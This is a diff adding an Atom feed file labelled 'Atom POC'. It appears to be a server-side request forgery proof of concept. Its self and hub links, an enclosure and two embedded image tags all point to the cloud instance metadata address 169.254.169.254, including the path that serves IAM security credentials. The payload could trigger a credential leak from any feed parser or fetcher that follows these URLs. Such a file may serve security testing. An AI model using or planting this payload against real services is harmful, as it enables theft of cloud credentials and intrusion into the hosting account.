@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Atom POC</title>
+  <link href="http://example.com"/>
+  <link rel="self" href="http://169.254.169.254/latest/meta-data/" type="application/atom+xml"/>
+  <link rel="hub" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" type="application/atom+xml"/>
+  <updated>2026-05-29T18:00:00Z</updated>
+  <id>tag:example.com,2026:atom-poc</id>
+  <entry>
+    <title>Atom entry 1</title>
+    <link href="http://example.com/1"/>
+    <link rel="enclosure" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" type="application/json"/>
+    <id>tag:example.com,2026:1</id>
+    <updated>2026-05-29T18:00:00Z</updated>
+    <summary type="html">&lt;img src="http://169.254.169.254/latest/meta-data/" alt="x"/&gt;</summary>
+    <content type="html"><![CDATA[<img src="http://169.254.169.254/" alt="imds"/>]]></content>
+  </entry>
+</feed>
